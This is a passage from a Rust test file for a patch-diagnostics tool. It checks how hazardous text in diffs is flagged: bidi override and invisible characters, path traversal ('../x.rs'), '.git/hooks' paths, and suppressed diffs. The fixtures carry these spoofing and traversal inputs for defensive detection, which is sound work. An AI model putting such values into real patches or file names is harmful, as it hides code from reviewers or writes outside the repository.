            "--- a/src/c.rs\n+++ b/src/c.rs\n@@ -1,1 +1,2 @@\n a\n+x\u{200B}\u{202E}\u{1b}\n";
        let found = repairs_of(&document(both).1, "hazardous_text@line");
        let kinds = vec!["bidi_control", "invisible", "control"];
        assert_eq!(found, [(Some(kinds), "hazardous_text:a1".to_owned())]);
    }

    /// F1.a3: a path that traverses or names `.git` is told to use another path, not to remove
    /// characters; a path with a bidi control is told to remove them; a file whose path and a
    /// line both raise it carries both on the line, since its path has no diagnostic of its own.
    #[test]
    fn a_hazardous_path_lists_only_the_path_repair() {
        let at = |path: &str, line: &str| {
            let patch = format!("--- a/{path}\n+++ b/{path}\n@@ -1,1 +1,2 @@\n a\n+{line}\n");
            document(&patch).1
        };
        let path = (Some(vec!["path_traversal"]), "hazardous_text:a2".to_owned());
        assert_eq!(
            repairs_of(&at("../x.rs", "b"), "hazardous_text@file"),
            [path]
        );
        let git = (Some(vec!["git_internal"]), "hazardous_text:a2".to_owned());
        assert_eq!(
            repairs_of(&at(".git/hooks/x", "b"), "hazardous_text@file"),
            [git]
        );
        let bidi = (Some(vec!["bidi_control"]), "hazardous_text:a1".to_owned());
        assert_eq!(
            repairs_of(&at("src/a\u{202E}b.rs", "b"), "hazardous_text@file"),
            [bidi]
        );
        let doc = at(".git/x", "b\u{202E}");
        let both = (
            Some(vec!["bidi_control", "git_internal"]),
            "hazardous_text:a1, hazardous_text:a2".to_owned(),
        );
        assert_eq!(repairs_of(&doc, "hazardous_text@line"), [both]);
        assert_eq!(repairs_of(&doc, "hazardous_text@file"), []);
        let renamed = "diff --git a/src/x\u{202E}.rs b/src/y.rs\nsimilarity index 100%\nrename from src/x\u{202E}.rs\nrename to src/y.rs\n";
        let left = (Some(vec!["bidi_control"]), "hazardous_text:a1".to_owned());
        assert_eq!(
            repairs_of(&document(renamed).1, "hazardous_text@file"),
            [left]
        );
    }

    /// F1.a3: lines that found no place give the label at its file with every kind of the file:
    /// of its lines, none cut, and of its path.
    #[test]
    fn an_unlocated_hazard_carries_every_kind_of_its_file() {
        let mut patch = hazards_after_rows(33, 1);
        patch.push_str("+let z = \"\u{200B}\";\n");
        let patch = patch.replace("+1,34 @@", "+1,35 @@");
        let found = repairs_of(&document(&patch).1, "hazardous_text@file");
        let kinds = vec!["bidi_control", "invisible"];
        assert_eq!(found, [(Some(kinds), "hazardous_text:a1".to_owned())]);
    }

    /// F1.a3: `diff_suppressed` carries its cause and lists the repair of that cause; `unread`,
    /// where the engine cannot tell the cause, lists them all.
    #[test]
    fn each_cause_of_diff_suppressed_lists_its_repair() {
        use deep_diff_forge_core::DiffSuppression as S;
        let patch = "--- a/src/m.rs\n+++ b/src/m.rs\n@@ -1,1 +1,2 @@\n a\n+b\n";
        for (cause, want) in [
            (S::Attribute, "diff_suppressed:a1"),
            (S::Content, "diff_suppressed:a2"),
            (S::Encoding, "diff_suppressed:a3"),
            (
                S::Unread,
                "diff_suppressed:a1, diff_suppressed:a2, diff_suppressed:a3",
            ),
        ] {
            let mut files = parse(patch).unwrap();
            files[0].patch_twin.diff_suppressed = Some(cause);
            let doc = diagnostics(&InputSeal::of(patch.as_bytes(), "test"), &rank(&files));
            let found = repairs_of(&doc, "diff_suppressed@file");
            assert_eq!(
                found,
                [(Some(vec![cause.label()]), want.to_owned())],
                "{cause:?}"
            );
        }
    }
}
